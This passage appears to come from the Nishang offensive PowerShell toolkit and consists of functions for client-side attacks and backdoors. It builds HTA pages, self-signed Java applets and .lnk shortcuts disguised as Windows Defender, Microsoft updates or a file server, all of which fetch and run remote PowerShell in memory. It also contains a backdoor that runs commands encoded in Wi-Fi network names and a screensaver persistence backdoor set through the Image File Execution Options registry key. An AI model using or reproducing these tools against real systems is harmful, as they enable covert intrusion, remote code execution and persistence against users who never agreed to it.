<p xmlns="">For updated detailed IT pro information about TCP/IP versions 4 and 6, see <a href="http://go.microsoft.com/fwlink/?LinkID=117437" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=117437</linkText></a> and <a href="http://go.microsoft.com/fwlink/?LinkID=71543" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=71543</linkText></a>.</p>
</content></div></div><hr /><p /></div></body></html>

"@

    #Write all files to disk for compilation
    Out-File -InputObject $CHMTableOfContents -FilePath "$OutputPath\doc.hhc" -Encoding default
    Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
    Out-File -InputObject $CHMHTML2 -FilePath "$OutputPath\doc1.htm" -Encoding default
    Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
    
    #Compile the CHM, only this needs to be sent to a target.
    $HHC = "$HHCPath" + "\hhc.exe"
    & "$HHC" "$OutputPath\doc.hhp"

    #Cleanup
    Remove-Item "$OutputPath\doc.hhc"
    Remove-Item "$OutputPath\doc.htm"
    Remove-Item "$OutputPath\doc1.htm"
    Remove-Item "$OutputPath\doc.hhp"
    
}

#######################################Out-HTA#############################################

function Out-HTA
{
<#
.SYNOPSIS
Nishang script which could be used for generating HTML Application and accompanying VBscript. These could be deployed on 
a web server and powershell scripts and commands could be executed on the target machine.

.DESCRIPTION
The script generates two files. A HTA file and a VBScript. The HTA and VBScript should be deployed in same directory of a web server.
When a target browses to the HTA file the VBScript is executed. This VBScript is used to execute powershell scripts and commands.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER HTAFilePath
Path to the HTA file to be generated. Default is with the name WindDef_WebInstall.hta in the current directory.

.PARAMETER VBFilename
Name of the VBScript file to be generated, use without ".vbs" extension. Default is launchps.vbs.

.PARAMETER VBFilepath
Path to the HTA file to be generated. Default is with the name launchps.vbs in the current directory.

.EXAMPLE
PS > Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"

Above command would execute Get-ChildItem on the target machine when the HTA is opened.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1

Use above command to generate HTA and VBS files which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM

Use above command to pass an argument to the powershell script/module.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $VBFilename="launchps.vbs",

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HTAFilePath="$pwd\WindDef_WebInstall.hta",


        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $VBFilepath="$pwd\launchps.vbs"
    )
    
    if(!$Payload)
    {
        $Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    
    $HTA = @"
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>Windows Defender Web Install</title>
    <script src="$VBFilename" type="text/vbscript" >
    </script>
    <hta:application
       id="oHTA"
       applicationname="Windows Defender Web Install"
       application="yes"
    >
    </hta:application>
    </head>

    <SCRIPT TYPE="text/javascript">
    function start(){

    Initialize();

    }
    //-->
    </SCRIPT>
    <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
    </object></div>   
 
  
    <body onload="start()">
    </body>
    </html>
"@

    $vbsscript = @"
    Sub Initialize()
    Set oShell = CreateObject( "WScript.Shell" )
    ps = "$Payload"
    oShell.run(ps),0,true
    End Sub
"@

    Out-File -InputObject $HTA -FilePath $HTAFilepath
    Out-File -InputObject $vbsscript -FilePath $VBFilepath
    Write-Output "HTA and VBS written to $HTAFilepath and $VBFilepath respectively."
}


#######################################Out-Java#############################################

function Out-Java
{

<#
.SYNOPSIS
Nishang script which could be used for generating JAR to be used for applets.

.DESCRIPTION
The script generates a Signed JAR and one line HTML code. These could be deployed on a web server. When a target opens
up the URL hosting these, the predefined PowerShell commands and scripts could be executed on the target.

If you want to use valid/trusted certificate for signing use the -NoSelfSign option.

The JAR generated checks for the OS architecture and calls the 32-bit version of PowerShell for script execution.
So you need to pass only the 32 bit shellcode to it. In case you would like to use 64 bit PowerShell, remove the "if"
condition marked in the source of Java code being generated.

The script needs JDK to be installed on the attacker's machine. The parameters passed to keytool and jarsigner
could be changed in the source for further customization. Those are not asked as function parameters to keep the 
number of parameters less for easy usage.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER $PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER $Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER $JDKPath
Patj to the JDK to compile the .Java code.

.PARAMETER $OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.PARAMETER $NoSelfSign
Use this switch if you don't want to create a self signed certificate for signing the JAR.

.EXAMPLE
PS > Out-Java -Payload "Get-Process" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Above command would execute Get-Process on the target machine when the JAR or Class file is executed.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/Get-Information.ps1 -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to generate JAR which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-Java -Payload "-e <EncodedScript>" -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to generate JAR which executes the encoded script.
Use Invoke-Command from Nishang to encode the script.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25"

Use above command to pass an argument to the powershell script/module.

.EXAMPLE
PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -JDKPath "C:\Program Files\Java\jdk1.7.0_25" -NoSelfSign

Due to the use of -NoSelfSign in above command, no self signed certificate would be used to sign th JAR.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $JDKPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath="$pwd",

        [switch]
        $NoSelfSign


    )


    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }    

#Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
    $JavaClass = @"
import java.applet.*;
import java.awt.*;
import java.io.*;
public class JavaPS extends Applet {
public void init() {
Process f;
//http://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
String arch = System.getenv("PROCESSOR_ARCHITECTURE");
String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
String cmd = "powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
//Remove the below if condition to use 64 bit powershell on 64 bit machines.
if (realArch == "64")
{
    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -nologo -noprofile $Payload";
}
try {
f = Runtime.getRuntime().exec(cmd);
}
catch(IOException e) {
e.printStackTrace();
}
Process s;
}
}
"@


    #Compile the Java file
    $JavaFile = "$OutputPath\JavaPS.java"
    Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile
    $JavacPath = "$JDKPath" + "\bin\javac.exe"
    & "$JavacPath" "$JavaFile"

    #Create a manifest for JAR, taken from SET
    $Manifest = @"
Permissions: all-permissions
Codebase: *
Application-Name: Microsoft Internet Explorer Update (SECURE)
"@
    $ManifestFile = "$OutputPath\manifest.txt"
    Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile

    #Create the JAR
    $Jarpath = "$JDKPath" + "\bin\jar.exe"
    & "$JarPath" "-cvfm" "$OutputPath\JavaPS.jar" "$ManifestFile" "JavaPS.class"
    
    #Parameters passed to keytool and jarsigner. You may change these to your choice.
    $KeystoreAlias = "SignApplet"
    $KeyStore = "PSKeystore"
    $StorePass = "PSKeystorePass"
    $KeyPass = "PSKeyPass"
    $DName = "cn=Windows Update, ou=Microsoft Inc, o=Microsoft Inc, c=US"

    if ($NoSelfSign -eq $False)
    {
        #Generate a keypair for self-signing
        #http://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
        $KeytoolPath = "$JDKPath" + "\bin\keytool.exe"
        & "$KeytoolPath" "-genkeypair" "-alias" "$KeystoreAlias" "-keystore" "$KeyStore" "-keypass" "$KeyPass" "-storepass" "$StorePass" "-dname" "$DName"

        #Self sign the JAR
        $JarSignerPath = "$JDKPath" + "\bin\jarsigner.exe"
        & "$JarSignerPath" "-keystore" "$KeyStore" "-storepass" "$StorePass" "-keypass" "$KeyPass" "-signedjar" "$OutputPath\SignedJavaPS.jar" "$OutputPath\JavaPS.jar" "SignApplet"
    
        #Output simple html. This could be used with any cloned web page.
        #Host this HTML and SignedJarPS.jar on a web server.
        $HTMLCode = @'
        <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
    </object></div>
    <applet code="JavaPS" width="1" height="1" archive="SignedJavaPS.jar" > </applet>'
'@
        $HTMLFile = "$OutputPath\applet.html"
        Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   

        #Cleanup
        Remove-Item "$OutputPath\PSKeyStore"
        Remove-Item "$OutputPath\JavaPS*"
    }
    elseif ($NoSelfSign -eq $True)
    {
        Write-Warning "You chose not to self sign. Use your valid certificate to sign the JavaPS.jar manually."
        #Cleanup
        Remove-Item "$OutputPath\JavaPS.java"
        Remove-Item "$OutputPath\JavaPS.class"
    }    
    #Cleanup to remove temporary files
    Remove-Item "$OutputPath\manifest.txt"
}


#######################################Out-Shortcut#############################################

function Out-Shortcut
{
<#
.SYNOPSIS
Nishang script which creates a shortcut capable of launching PowerShell commands and scripts.

.DESCRIPTION
The script generates a shortcut (.lnk). When a target opens the shortcut, the predefined powershell scripts and/or commands get executed.
A hotkey for the shortcut could also be generated. Also, the icon of the shortcut could be set too.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER OutputPath
Path to the .lnk file to be generated. Default is with the name Shortcut to File Server.lnk in the current directory.

.PARAMETER Hotkey
The Hotkey to be assigned to the shortcut. Default is F5.

.PARAMETER Icon
The Icon to be assigned to the generated shortcut. Default is that of explorer.exe

.EXAMPLE
PS > Out-Shortcut -Payload "-WindowStyle hidden -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"

Above command would execute Get-ChildItem on the target machine when the shortcut is opened. Note that powershell.exe is 
not a part of the payload as the shortcut already points to it.

.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/Get-Wlan-Keys.ps1

Use above command to generate a Shortcut which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-Shortcut -Payload "-EncodedCommand <>"

Use above command to generate a Shortcut which executes the given encoded command/script.
Use Invoke-Encode from Nishang to encode the command or script.


.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM

Use above command to pass an argument to the powershell script/module.

.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3'

Use above command to assign F3 as hotkey to the shortcut

.EXAMPLE
PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3' -Icon 'notepad.exe'

Use above command to assign notepad icon to the generated shortcut.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\Shortcut to File Server.lnk",

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HotKey = 'F5',


        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $Icon='explorer.exe'




    )
    if(!$Payload)
    {
        $Payload = " -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($OutputPath)
    $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
    $Shortcut.Description = "Shortcut to Windows Update Commandline"
    $Shortcut.WindowStyle = 7
    $Shortcut.Hotkey = $HotKey
    $Shortcut.IconLocation = "$Icon,0"
    $Shortcut.Arguments = $Payload
    $Shortcut.Save()
    Write-Output "The Shortcut file has been written as $OutputPath"

}
##################################End of Client Side Attack functions###############################

##################################### Gupt Backdoor #################################################
function Gupt-Backdoor
{
<#
.SYNOPSIS
Gupt is a backdoor in Nishang which could execute commands and scripts from specially crafted Wireless Network Names.

.DESCRIPTION
Gupt looks for a specially crafted Wireless Network Name/SSID from list of all avaliable networks. It matches first four characters of
each SSID with the parameter MagicString. On a match, if the 5th character is a 'c', rest of the SSID name is considered to be a command and
exeucted. If the 5th character is a 'u', rest of the SSID is considered the id part of Google URL Shortener and a script is downloaded and
executed in memory from the URL. See examples for usage. 

Gupt does not connect to any Wireless network and this makes it more stealthy and helps in bypassing network traffic monitoring. 

.PARAMETER MagicString
The string which Gupt would compare with the available SSIDs. 

.PARAMETER Arguments
Arguments to pass to a downloaded script.

.EXAMPLE
PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". To execute whoami on the target, the wireless network name should be "op3ncwhoami".

PS > Gupt-Backdoor -MagicString op3n -Verbose
In above, Gupt will look for an SSID starting with "op3n". To execute a powershell script on the target, the wireless network name should be
"op3nunJEuug". Here, Gupt will use of characters after the 5th one and make the URL http://goo.gl/nJEuug. A script hosted at the URL resolved
by the Google shortener would be downloaded and executed. 

.LINK
http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $Arguments
 
    )
    #Get list of available Wlan networks
    while($True)
    {
        Write-Verbose "Checking wireless networks for instructions."
        $networks = Invoke-Expression "netsh wlan show network"
        $ssid = $networks | Select-String "SSID"
        $NetworkNames = $ssid -replace ".*:" -replace " "
        ForEach ($network in $NetworkNames)
        {
            #Check if the first four characters of our SSID matches the given MagicString
            if ($network.Substring(0,4) -match $MagicString.Substring(0,4))
            {
                Write-Verbose "Found a network with instructions!"
                #If the netowrk SSID contains fifth chracter "u", it means rest of the SSID is a URL
                if ($network.Substring(4)[0] -eq "u")
                {
                    Write-Verbose "Downloading the attack script and executing it in memory."
                    $PayloadURL = "http://goo.gl/" + $network.Substring(5)
                    $webclient = New-Object System.Net.WebClient
                    Invoke-Expression $webclient.DownloadString($PayloadURL)
                    if ($Arguments)
                    {
                        Invoke-Expression $Arguments                   
                    }
                    Start-Sleep -Seconds 10
                }
                elseif ($network.Substring(4)[0] -eq "c")
                {
                    $cmd =  $network.Substring(5)
                    if ($cmd -eq "exit")
                    {
                        break
                    }
                    Write-Verbose "Command `"$cmd`" found. Executing it."
                    Invoke-Expression $cmd
                    Start-Sleep -Seconds 10
                }
            }
        }
        Start-Sleep -Seconds 5
    }
}

###################################Function for generating encoded DNS TXT Records###########################
function Out-DnsTxt
{
<#
.SYNOPSIS
Script for Nishang to generate DNS TXT records which could be used with other scripts. 

.DESCRIPTION
Use this script to generate DNS TXT records to be used with DNS_TXT_Pwnage and Execute-DNSTXT-Code.
The script asks for a path to a plain file or string, compresses and encodes it and writes to a file "encodedtxt.txt" in the current working directory.
Each line in the generated file is a DNS TXT record to be saved in separate subbdomain.
The length of DNS TXT records is assumed to be 255 characters by the script.

.PARAMETER DataToEncode
The path of the file to be decoded. Use with -IsString to enter a string.

.PARAMETER OutputFilePath
The path of the output file. Default is "encodedtxt.txt" in the current working directory.

.PARAMETER $LengthOfTXT
The length of the TXT records. Default is 255.

.PARAMETER IsString
Use this to specify the command to be encoded if you are passing a string in place of a filepath.

.EXAMPLE
PS > OUT-DNSTXT -DataToEncode C:\nishang\Gather\Get-Information.ps1
Use above command to generate encoded DNS TXT records. Each record must be put in a separate subdomain.

.EXAMPLE
PS > OUT-DNSTXT "Get-Service" -IsString
Use above to generate TXT records for a command.


.EXAMPLE
PS > OUT-DNSTXT -DataToEncode C:\shellcode\shellcode.txt
Use above command to generate encoded DNS TXT records for a shellcode. Each record must be put in a separate subdomain.

.LINK
http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
https://github.com/samratashok/nishang

#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DataToEncode,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $OutputFilePath = "$pwd\encodedtxt.txt", 

        [Parameter(Mandatory = $False)]
        [String]
        $LengthOfTXT = 255, 

        [Switch]
        $IsString
    )
    if($IsString -eq $true)
    {
    
       $Enc = $DataToEncode
       
    }
    else
    {
        $Enc = Get-Content $DataToEncode -Encoding Ascii
    }
    
    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
    $ms = New-Object IO.MemoryStream
    $action = [IO.Compression.CompressionMode]::Compress
    $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
    $Enc | ForEach-Object {$sw.WriteLine($_)}
    $sw.Close()
    # Base64 encode stream
    $Compressed = [Convert]::ToBase64String($ms.ToArray())
    $index = [math]::floor($Compressed.Length/$LengthOfTXT)
    $i = 0
    Out-File -InputObject $null -FilePath $OutputFilePath
    #Split encoded input in strings of 255 characters if its length is more than 255.
    if ($Compressed.Length -gt $LengthOfTXT)
    {
        while ($i -lt $index )
        {
            $TXTRecord = $Compressed.Substring($i*$LengthOfTXT,$LengthOfTXT)
            $i +=1
            Out-File -InputObject $TXTRecord -FilePath $OutputFilePath -Append
            Out-File -InputObject "`n`n`n" -FilePath $OutputFilePath -Append
        }
        $remainingindex = $Compressed.Length%$LengthOfTXT
        if ($remainingindex -ne 0)
        {
            $TXTRecord = $Compressed.Substring($index*$LengthOfTXT, $remainingindex)
            $TotalRecords = $index + 1
        }
        #Write to file
        Out-File -InputObject $TXTRecord -FilePath $OutputFilePath -Append
        Write-Output "You need to create $TotalRecords TXT records."
        Write-Output "All TXT Records written to $OutputFilePath"
    }
    #If the input has small length, it could be used in a single subdomain.
    else
    {
        Write-Output "TXT Record could fit in single subdomain."
        Write-Output $Compressed
        Out-File -InputObject $Compressed -FilePath $OutputFilePath -Append
        Write-Output "TXT Records written to $OutputFilePath"
    }


}

##########################################Function for adding screensaver backdoor###########################################
function Add-ScrnSaveBackdoor
{
<#
.SYNOPSIS
Nishang Script which could set Debugger registry keys for a screensaver to remotely execute commands and scripts. 

.DESCRIPTION
The script reads the value of Windows registry key HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE 
to check for the existing Screensaver. If none exists, one from the default ones which exist in C:\Windows\System32 is used.
A Debugger to the screensaver is created at HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\. 
It is the value of the "Debugger" to this key where it writes the payload. A screensaver selected from the default ones is added to this payload.

When the payload is executed, the screensaver also runs after it to make it appear legit. Change the contents of the payload URL
to execute different scripts using the same backdoor.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER NewScreenSaver
Full path to the screensaver to be used if none is being used. Default is C:\Windows\System32\Ribbons.scr

.EXAMPLE
PS > Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed.


.EXAMPLE
PS > Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/FireBuster.ps1 -Arguments "FireBuster 192.168.254.1 8440-8445"

Use above to execute FireBuster from Nishang for Egress Testing.

.EXAMPLE
PS > Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor "http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis

Use above to execute HTTP-Backdoor from Powerpreter

.EXAMPLE
PS > Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code_exec.ps1

Use above to execute an in-memory meterpreter in PowerShell format generated using msfvenom 
(./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226 -f powershell)


.LINK
http://www.labofapenetrationtester.com/2015/02/using-windows-screensaver-as-backdoor.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $NewScreenSaver = "C:\Windows\System32\Ribbons.scr"
    )
    
    #Check if ScreenSaver is enabled
    #If no enable it, if yes, get its value
    if ((Get-Item "HKCU:\Control Panel\Desktop\").GetValue("SCRNSAVE.EXE") -eq $null)
    {
        New-ItemProperty "HKCU:\Control Panel\Desktop\" -Name SCRNSAVE.EXE -Value $NewScreenSaver -PropertyType String
        $ScreenSaverName = ($NewScreenSaver -split '\\')[-1]
    }
    else
    {
        $ScreenSaverName = ((Get-Item "HKCU:\Control Panel\Desktop\").GetValue("SCRNSAVE.EXE") -split '\\')[-1]
    }

    #Set ScreenSaveTimeOut which is necessary to enable screensaver.
    if ((Get-Item "HKCU:\Control Panel\Desktop\").GetValue("ScreenSaveTimeOut") -eq $null)
    {
        New-ItemProperty "HKCU:\Control Panel\Desktop\" -Name ScreenSaveTimeOut -Value 60 -PropertyType String
    } 
    else
    {
        Set-ItemProperty "HKCU:\Control Panel\Desktop\" -Name ScreenSaveTimeOut -Value 60
    }
    
    #Get a list of default screensavers and select one at random
    $ListScrn = Get-ChildItem C:\Windows\System32\*.scr | Where-Object {$_.Name -ne $ScreenSaverName}
    $PathToScreensaver = Get-Random $ListScrn

    #Add a default screensaver to payload so that it runs after our payload.
    if(!$Payload)
    {
        $RegValue = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments" + ";" + $PathToScreensaver + " /s"
    }
    elseif ($Payload)
    {
        $RegValue = $Payload + ";" + $Arguments + ";" + $PathToScreensaver + " /s"
    }
    #Set Debugger for the ScreenSaver executable
    if (Test-Path -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName")
    {
        
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName" -Name Debugger -Value $RegValue
        Write-Output "Payload added as Debugger for $ScreenSaverName"
    }
    else
    {
        New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName"
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName" -Name Debugger -Value $RegValue
        Write-Output "Payload added as Debugger for $ScreenSaverName"
    }
}